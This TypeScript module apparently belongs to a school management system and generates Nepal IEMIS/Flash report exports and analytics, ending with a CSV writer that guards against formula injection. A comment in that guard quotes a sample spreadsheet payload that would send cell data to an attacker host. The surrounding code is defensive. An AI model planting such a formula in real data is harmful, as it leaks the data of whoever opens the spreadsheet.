import { Student } from "../models/Student.js";
import { Teacher } from "../models/Teacher.js";
import { Setting } from "../models/Setting.js";
import { Exam } from "../models/Exam.js";
import { Result } from "../models/Result.js";
import { Attendance } from "../models/Attendance.js";
import { DailyAttendance } from "../models/DailyAttendance.js";
import { CollegeStaff } from "../models/CollegeStaff.js";
import type { Request } from "express";
import { tenantObjectId } from "./tenant.js";
import { formatAddressLine } from "./formatAddress.js";
import { getInstitutionType, isCollege } from "./institution.js";
import { getOffsetBsDate, getTodayBs } from "./nepaliDate.js";

/** Statuses that mean the student attended the class. */
const ATTENDED = new Set(["PRESENT", "LATE", "EARLY_LEAVE"]);

/** "2081 Batch · 1st Year" (college) or "Class 5 · A" (school). */
const studentGroupLabel = (student: Record<string, unknown>, college: boolean): string => {
  const name = (ref: unknown) => (ref && typeof ref === "object" ? String((ref as { name?: string }).name ?? "") : "");
  const parts = college ? [name(student.batchId), name(student.yearId)] : [name(student.classId), name(student.sectionId)];
  return parts.filter(Boolean).join(" · ") || "Not assigned";
};

/** Current academic year from settings, else "Current". */
const currentAcademicYear = async (schoolId: unknown): Promise<string> => {
  const setting = await Setting.findOne({ schoolId }).select("academicYearBs").lean();
  return (setting as { academicYearBs?: string } | null)?.academicYearBs || "Current";
};

/**
 * Attendance rate from Student Daily Attendance (final sheets) — subject-wise sheets are
 * used only when no daily sheet exists. Present, Late and Early leave count as attended.
 */
const attendanceRate = async (schoolId: unknown, fromDateBs?: string) => {
  const dateFilter = fromDateBs ? { dateBs: { $gte: fromDateBs } } : {};
  const daily = await DailyAttendance.find({ schoolId, status: { $ne: "DRAFT" }, ...dateFilter })
    .select("entries.status")
    .lean();
  const sheets = daily.length > 0 ? daily : await Attendance.find({ schoolId, ...dateFilter }).select("entries.status").lean();
  let total = 0;
  let attended = 0;
  for (const sheet of sheets as Array<{ entries?: Array<{ status?: string }> }>) {
    for (const entry of sheet.entries ?? []) {
      total += 1;
      if (ATTENDED.has(String(entry.status))) attended += 1;
    }
  }
  return { total, rate: total > 0 ? Math.round((attended / total) * 10000) / 100 : 0 };
};


/**
 * IEMIS Export Service - Expanded Version
 * 
 * Supports key parts of Nepal's IEMIS / Flash Reports (CEHRD):
 * - Flash I: Student enrollment, Teacher data, Infrastructure
 * - Flash II: Performance indicators (promotion, results, attendance)
 */

export interface StudentMasterRow {
  admissionNumber: string;
  fullName: string;
  gender: string;
  dateOfBirthBs: string;
  className: string;
  sectionName: string;
  rollNumber: number;
  disabilityCategory: string;
  ethnicityCategory: string;
  religion: string;
  caste: string;
  fatherPhone: string;
  motherPhone: string;
  guardianName: string;
  guardianPhone: string;
  address: string;
  feesDueNpr: number;
  academicStatus: string;
}

export interface TeacherMasterRow {
  teacherCode: string;
  fullName: string;
  gender?: string;
  qualification: string;
  joinedDateBs: string;
  subjects: string;
  paymentType?: string;
  basicSalaryNpr: number;
  periodRateNpr?: number;
  tenderAmountNpr?: number;
}

export interface InfrastructureRow {
  schoolId: string;
  academicYearBs: string;
  classrooms: number;
  usableClassrooms: number;
  toiletsMale: number;
  toiletsFemale: number;
  toiletsDisabled: number;
  drinkingWater: boolean;
  electricity: boolean;
  internet: boolean;
  libraryBooks: number;
  hasScienceLab: boolean;
  hasComputerLab: boolean;
  hasPlayground: boolean;
  hasRamp: boolean;
  midDayMeal: boolean;
}

export interface FlashIIPerformance {
  academicYearBs: string;
  totalStudents: number;
  averageAttendanceRate: number; // percentage
  examParticipation: number;
  averageGpa: number;
  promotionRateEstimate: number; // rough proxy
  topPerformersCount: number;
  studentsWithLowPerformance: number;
}

/**
 * Student Master Export (existing + refined)
 */
export async function generateStudentMasterExport(req: Request): Promise<StudentMasterRow[]> {
  const schoolId = tenantObjectId(req);

  const students = await Student.find({ schoolId })
    .populate("classId", "name")
    .populate("sectionId", "name")
    .populate("batchId", "name")
    .populate("yearId", "name")
    .populate("user", "fullName")
    .lean();

  return students.map((s: any) => ({
    admissionNumber: s.admissionNumber,
    fullName: s.user?.fullName || "",
    gender: s.gender,
    dateOfBirthBs: s.dateOfBirthBs,
    className: s.batchId?.name || s.classId?.name || "",
    sectionName: s.yearId?.name || s.sectionId?.name || "",
    rollNumber: s.rollNumber,
    disabilityCategory: s.disabilityCategory || "None",
    ethnicityCategory: s.ethnicityCategory || "",
    religion: s.religion || "",
    caste: s.caste || "",
    fatherPhone: s.fatherPhone || "",
    motherPhone: s.motherPhone || "",
    guardianName: s.guardianName,
    guardianPhone: s.guardianPhone,
    address: formatAddressLine(s.address) || "",
    feesDueNpr: s.feesDueNpr || 0,
    academicStatus: s.academicStatus || "ACTIVE"
  }));
}

/**
 * Teacher Data Export (new)
 */
export async function generateTeacherMasterExport(req: Request): Promise<TeacherMasterRow[]> {
  const schoolId = tenantObjectId(req);

  const teachers = await Teacher.find({ schoolId, status: { $ne: "INACTIVE" } })
    .populate("user", "fullName")
    .populate("subjects", "name")
    .lean();

  return teachers.map((t: any) => ({
    teacherCode: t.teacherCode,
    fullName: t.user?.fullName || "",
    qualification: t.qualification,
    joinedDateBs: t.joinedDateBs,
    subjects: (t.subjects || []).map((s: any) => s.name).join("; ") || "",
    paymentType: t.paymentType || "MONTHLY",
    basicSalaryNpr: t.basicSalaryNpr || 0,
    periodRateNpr: t.periodRateNpr || 0,
    tenderAmountNpr: Array.isArray(t.tenders)
      ? t.tenders.reduce(
          (sum: number, row: { tenderAmountNpr?: number }) =>
            sum + (Number(row.tenderAmountNpr) || 0),
          0
        )
      : 0
  }));
}

/**
 * Infrastructure Export (new)
 */
export async function generateInfrastructureExport(req: Request): Promise<InfrastructureRow> {
  const schoolId = tenantObjectId(req);

  const setting = await Setting.findOne({ schoolId }).lean();

  const infra = (setting as any)?.infrastructure || {};

  return {
    schoolId: schoolId.toString(),
    academicYearBs: setting?.academicYearBs || "N/A",
    classrooms: infra.classrooms || 0,
    usableClassrooms: infra.usableClassrooms || 0,
    toiletsMale: infra.toiletsMale || 0,
    toiletsFemale: infra.toiletsFemale || 0,
    toiletsDisabled: infra.toiletsDisabled || 0,
    drinkingWater: !!infra.drinkingWater,
    electricity: !!infra.electricity,
    internet: !!infra.internet,
    libraryBooks: infra.libraryBooks || 0,
    hasScienceLab: !!infra.hasScienceLab,
    hasComputerLab: !!infra.hasComputerLab,
    hasPlayground: !!infra.hasPlayground,
    hasRamp: !!infra.hasRamp,
    midDayMeal: !!infra.midDayMeal
  };
}

/**
 * Improved Flash II Performance Data
 */
export async function generateFlashIIPerformance(req: Request): Promise<FlashIIPerformance> {
  const schoolId = tenantObjectId(req);

  const [studentCount, results, attendance, academicYearBs] = await Promise.all([
    Student.countDocuments({ schoolId, academicStatus: { $in: ["ACTIVE", "PENDING_NOT_PASSED"] } }),
    Result.find({ schoolId }).select("gpa passFailStatus studentId").lean(),
    attendanceRate(schoolId),
    currentAcademicYear(schoolId)
  ]);

  const gpas = results.map((r) => Number(r.gpa) || 0).filter((g) => g > 0);
  const avgGpa = gpas.length > 0 ? gpas.reduce((a, b) => a + b, 0) / gpas.length : 0;
  const passed = results.filter((r) => r.passFailStatus === "PASS").length;

  return {
    academicYearBs,
    totalStudents: studentCount,
    averageAttendanceRate: attendance.rate,
    examParticipation: new Set(results.map((r) => String(r.studentId))).size,
    averageGpa: Math.round(avgGpa * 100) / 100,
    // Share of published results that are a Pass (was a fixed guess from the GPA)
    promotionRateEstimate: results.length > 0 ? Math.round((passed / results.length) * 10000) / 100 : 0,
    topPerformersCount: results.filter((r) => (Number(r.gpa) || 0) >= 3.6).length,
    studentsWithLowPerformance: results.filter((r) => r.passFailStatus === "FAIL").length
  };
}

/**
 * Legacy Enrollment Summary (kept for compatibility)
 */
export async function generateEnrollmentSummary(req: Request) {
  const schoolId = tenantObjectId(req);
  const college = isCollege(await getInstitutionType(req));
  // Enrollment = students currently enrolled (studying or with back papers)
  const students = await Student.find({ schoolId, academicStatus: { $in: ["ACTIVE", "PENDING_NOT_PASSED"] } })
    .populate("classId", "name")
    .populate("sectionId", "name")
    .populate("batchId", "name")
    .populate("yearId", "name")
    .lean();

  const summary: any = {
    totalStudents: students.length,
    byGender: {},
    byClass: [],
    byDisability: [],
    byEthnicity: [],
    byReligion: [],
    byCaste: []
  };

  students.forEach((s: any) => {
    const g = s.gender || "Unknown";
    summary.byGender[g] = (summary.byGender[g] || 0) + 1;

    const c = studentGroupLabel(s, college);
    const existingClass = summary.byClass.find((x: any) => x.className === c);
    if (existingClass) existingClass.count++;
    else summary.byClass.push({ className: c, count: 1 });

    const d = s.disabilityCategory || "None";
    const existingD = summary.byDisability.find((x: any) => x.category === d);
    if (existingD) existingD.count++;
    else summary.byDisability.push({ category: d, count: 1 });

    const eth = s.ethnicityCategory || "Unset";
    const existingEth = summary.byEthnicity.find((x: any) => x.category === eth);
    if (existingEth) existingEth.count++;
    else summary.byEthnicity.push({ category: eth, count: 1 });

    const r = s.religion || "Unset";
    const existingR = summary.byReligion.find((x: any) => x.category === r);
    if (existingR) existingR.count++;
    else summary.byReligion.push({ category: r, count: 1 });

    const caste = (s.caste || "").trim() || "Unset";
    const existingCaste = summary.byCaste.find((x: any) => x.category === caste);
    if (existingCaste) existingCaste.count++;
    else summary.byCaste.push({ category: caste, count: 1 });
  });

  const sortByCount = (rows: Array<{ count: number }>) => rows.sort((a, b) => b.count - a.count);
  summary.byClass.sort((a: any, b: any) => String(a.className).localeCompare(String(b.className), undefined, { numeric: true }));
  sortByCount(summary.byDisability);
  sortByCount(summary.byEthnicity);
  sortByCount(summary.byReligion);
  sortByCount(summary.byCaste);
  return summary;
}

/**
 * One-screen analytics for Reports & Analytics: enrollment, staff, attendance, results
 * and infrastructure, all for the signed-in institution.
 */
export async function generateReportsAnalytics(req: Request) {
  const schoolId = tenantObjectId(req);
  const [enrollment, statusRows, teachers, staff, attendanceAll, attendance30, results, infrastructure, academicYearBs] =
    await Promise.all([
      generateEnrollmentSummary(req),
      Student.aggregate<{ _id: string; count: number }>([
        { $match: { schoolId } },
        { $group: { _id: { $ifNull: ["$academicStatus", "ACTIVE"] }, count: { $sum: 1 } } }
      ]),
      Teacher.countDocuments({ schoolId, status: { $ne: "INACTIVE" } }),
      CollegeStaff.countDocuments({ schoolId, isDeleted: { $ne: true }, status: { $ne: "INACTIVE" } }),
      attendanceRate(schoolId),
      attendanceRate(schoolId, getOffsetBsDate(-30)),
      Result.find({ schoolId }).select("gpa passFailStatus").lean(),
      generateInfrastructureExport(req),
      currentAcademicYear(schoolId)
    ]);
  const gpas = results.map((r) => Number(r.gpa) || 0).filter((g) => g > 0);
  const passed = results.filter((r) => r.passFailStatus === "PASS").length;
  const statusLabels: Record<string, string> = {
    ACTIVE: "Studying",
    PENDING_NOT_PASSED: "Back (not passed)",
    PASSED_OUT: "Passed out",
    ALUMNI: "Alumni",
    WITHDRAWN: "Withdrawn",
    CANCELLED: "Cancelled",
    SUSPENDED: "Suspended"
  };
  return {
    academicYearBs,
    generatedAt: getTodayBs(),
    students: {
      enrolled: enrollment.totalStudents,
      allRecords: statusRows.reduce((s, r) => s + r.count, 0),
      byStatus: statusRows
        .map((r) => ({ category: statusLabels[r._id] ?? r._id, count: r.count }))
        .sort((a, b) => b.count - a.count),
      byGender: Object.entries(enrollment.byGender as Record<string, number>)
        .map(([category, count]) => ({ category, count }))
        .sort((a, b) => b.count - a.count),
      byGroup: (enrollment.byClass as Array<{ className: string; count: number }>).map((row) => ({
        category: row.className,
        count: row.count
      })),
      byDisability: enrollment.byDisability,
      byEthnicity: enrollment.byEthnicity,
      byReligion: enrollment.byReligion,
      byCaste: enrollment.byCaste
    },
    staff: { teachers, otherStaff: staff },
    attendance: {
      overallRate: attendanceAll.rate,
      overallMarks: attendanceAll.total,
      last30DaysRate: attendance30.rate,
      last30DaysMarks: attendance30.total
    },
    results: {
      results: results.length,
      passRate: results.length > 0 ? Math.round((passed / results.length) * 10000) / 100 : 0,
      averageGpa: gpas.length > 0 ? Math.round((gpas.reduce((a, b) => a + b, 0) / gpas.length) * 100) / 100 : 0,
      passed,
      failed: results.filter((r) => r.passFailStatus === "FAIL").length,
      topPerformers: results.filter((r) => (Number(r.gpa) || 0) >= 3.6).length
    },
    infrastructure
  };
}

/**
 * Neutralize spreadsheet formula injection (CWE-1236).
 *
 * These CSVs carry free text that people type in — names, addresses, remarks.
 * Excel and LibreOffice execute any cell whose text begins with =, +, -, @, tab
 * or CR, so a student saved as =HYPERLINK("http://attacker/"&A1,"Click") becomes
 * a live formula the moment an admin opens the export. Prefixing with an
 * apostrophe is the standard mitigation: the cell displays, and re-imports, as
 * literal text.
 *
 * A leading + or - on an otherwise plain number (phone numbers such as
 * +9779800000000, negative amounts) is left alone — those are values, not
 * formulas, and rewriting them would corrupt the government IEMIS import.
 */
function neutralizeCsvFormula(value: string): string {
  if (!value) return value;
  const first = value[0]!;
  if (first === "=" || first === "@" || first === "\t" || first === "\r") {
    return `'${value}`;
  }
  if ((first === "+" || first === "-") && !/^[+-][\d.,\s]*$/.test(value)) {
    return `'${value}`;
  }
  return value;
}

/** CSV helper with proper escaping */
export function toCsv(rows: any[], headerKeys?: string[]): string {
  // An empty export still carries its column headings
  if (!rows.length) return headerKeys ? headerKeys.join(",") : "";
  const headers = headerKeys ?? Object.keys(rows[0]);
  const csvRows = [headers.join(",")];

  for (const row of rows) {
    const values = headers.map((header) => {
      let val = row[header] ?? "";
      if (typeof val === "string") {
        val = neutralizeCsvFormula(val);
        if (val.includes(",") || val.includes('"') || val.includes("\n")) {
          val = `"${val.replace(/"/g, '""')}"`;
        }
      }
      return val;
    });
    csvRows.push(values.join(","));
  }
  return csvRows.join("\r\n");
}
